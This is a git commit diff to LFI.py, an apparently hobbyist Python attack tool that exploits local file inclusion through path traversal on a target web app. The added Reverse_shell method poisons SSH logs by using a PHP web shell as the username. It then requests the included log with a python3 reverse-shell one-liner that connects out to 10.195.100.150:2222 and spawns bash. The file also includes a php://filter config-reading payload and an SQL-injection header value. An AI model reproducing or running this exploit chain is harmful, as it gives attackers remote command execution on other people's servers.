2b0658cd550ffbc64e69ee8c6e63189d28566b8f
jac11 <jac11devel@gmail.com>
2022-09-23 18:21:08 -0400

    Add files via upload

--- LFI.py
+++ LFI.py
@@ -7,34 +7,53 @@ import mechanize
 import ssl
 import urllib
 import re
+import os
+import subprocess
 ssl._create_default_https_context = ssl._create_unverified_context     
 #php://filter/read=convert.base64-encode/resource=../../config.php
+#ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
 class Local_File_In :
     
         def __init__(self):
             self.control()
+            if self.args.Cookie:
+                  with open(self.args.Cookie,'r') as Cookie_file :
+                      self.Cookie =  Cookie_file.read()
+            print('\n'+'='*15+"\n[*] Input-INFO "+'\n'+'='*15+'\n')
+            if self.args.auth:
+               print("[+] Login url        : ................ | : "+self.args.loginurl)
+               print("[+] username         : ................ | : "+self.args.user)
+               print("[+] Login password   : ................ | : "+self.args.password)
+               print("[+] Mothead          : ................ | : Full authentication")    
+            print("[+] LFI-wordlist     : ................ | : "+self.args.filelist)
+            print("[+] Vulnrenable url  : ................ | : "+self.args.Vulnurl)
+            print("[+] web Cookies      : ................ | : "+self.Cookie) 
+            print('='*30+"\n[*] Web-Info "+'\n'+'='*15+'\n')
             if self.args.auth and self.args.Vulnurl\
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl\
             and self.args.filelist:
                 self.Login_auth()
                 self.url_request()
+                self.Reverse_shell()
             elif not self.args.auth and self.args.Vulnurl\
             and not self.args.password and not self.args.user and self.args.Cookie\
             and self.args.filelist :
                 self.url_request()
+                self.Reverse_shell()
             else:
-                print("[+] Error")    
+                print("[+] Logic command  Error"+'\n'+'='*30)  
+                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
+                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie')  
+                
         def Login_auth(self):
             loginurl = self.args.loginurl
             request = mechanize.Browser()
             request.set_handle_robots(False)
             request.set_handle_redirect(True)
             request.set_handle_refresh(True, max_time=1)
-            with open(self.args.Cookie,'r') as Cookie_file :
-                      Cookie =  Cookie_file.read() 
             request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                 ('Cookie',str(Cookie).replace('\n','')),]
+                                 ('Cookie',str(self.Cookie).replace('\n','')),]
             url_login = request.open(loginurl) 
             request.select_form(nr = 0)
             if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
@@ -51,10 +70,11 @@ class Local_File_In :
                    request[f'{self.args.PassForm}']=f'{self.args.password}' 
             response   = request.submit()         
             self.info = response.info()
+           
           #  self.info_req =  self.info 
             content    = response.read()  
             self.url = response.geturl()      
-        def url_request(self):
+        def url_request(self):            
             LFI=''
             LFI += self.args.Vulnurl
             LFI += "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
@@ -65,36 +85,69 @@ class Local_File_In :
                if self.args.auth:
                   self.Login_auth() 
                command  = str(command).replace('/','%2F')         
-               url = LFI+command
+               self.url = LFI+command
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.set_handle_redirect(True)
-               request.set_handle_refresh(True, max_time=1)
-               if self.args.Cookie:
-                  with open(self.args.Cookie,'r') as Cookie_file :
-                      Cookie =  Cookie_file.read() 
-                      request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-                                            ('Cookie',str(Cookie).replace('\n','')),
-                                            ('username',"admin'#"),
-                                            ('password','password')]
-               else:
-                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
-                                           Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]  
+               request.set_handle_refresh(True, max_time=1)              
+               request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                                      Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                    ('Cookie',str(self.Cookie).replace('\n','')),
+                                    ('username',"admin'#"),
+                                    ('password','password')]
                first_req = request.open(self.args.Vulnurl).read()                                                      
-               Get_Oregnal_URL = request.open(url).read()                
+               Get_Oregnal_URL = request.open(self.url).read()                
                #if self.args.auth and  len(Get_Oregnal_URL) !=   self.info[26] :
                if self.args.auth and len(Get_Oregnal_URL) != len(first_req) :                  
                   pythex = str(re.findall('Content-Length:.+',str(self.info)))
                   pythex= pythex.replace("['",'').replace("']",'')
                   if pythex in str(self.info):
                     info = str(self.info).replace(pythex,'Content-Length:'+str(len(Get_Oregnal_URL)))
-                    print(info)
-                  print(url)
-                  exit() 
+                    rex2 = re.findall(':.+',info)
+                    print("[+] Date             : ................ | "+rex2[0])
+                    print("[+] Server           : ................ | "+rex2[1])
+                    print("[+] Expires          : ................ | "+rex2[2])
+                    print("[+] Cache-Control    : ................ | "+rex2[3])
+                    print("[+] Pragma           : ................ | "+rex2[4])
+                    print("[+] Vary             : ................ | "+rex2[5])
+                    print("[+] Content-Length   : ................ | "+str(rex2[6]).replace(':',': '))
+                    print("[+] Connection       : ................ | "+rex2[7])
+                    print("[+] Content-Type     : ................ | "+rex2[8])
+                    
+                    exit()      
+                  print(self.url)
+                  with open('index3.htnl','w') as html:
+                       html.write(str(Get_Oregnal_URL).replace("b'",''))
+                  break 
                elif not self.args.auth and len(Get_Oregnal_URL) != len(first_req) :
-                     print(url)  
-                     exit()
+                      with open('index3.htnl','w') as html:
+                         html.write(str(Get_Oregnal_URL).replace("b'",''))
+                      print(self.url)  
+                      break 
+        def Reverse_shell(self):
+                 if 'log' in self.url :
+                    order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
+                    command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
+                    call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
+                    time.sleep(10)
+                    command ="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.195.100.150",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
+                    fake_link = self.url.replace('\n','')+"&cmd="+command.replace('\n','')
+                    print(fake_link)
+                    request = mechanize.Browser()
+                    request.set_handle_robots(False)
+                    request.set_handle_redirect(True)
+                    request.set_handle_refresh(True, max_time=1)
+                    if self.args.Cookie:
+                       with open(self.args.Cookie,'r') as Cookie_file :
+                           Cookie =  Cookie_file.read() 
+                           request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                            ('Cookie',str(Cookie).replace('\n','')),
+                                            ('username',"admin'#"),
+                                            ('password','password')]
+                    feka_log = request.open(fake_link).read() 
+                    print(feka_log )
+                            
         def control(self): 
            parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
            parser.add_argument("-UV ","--Vulnurl"              , action=None ,required=True      ,help ="url Targst web") 
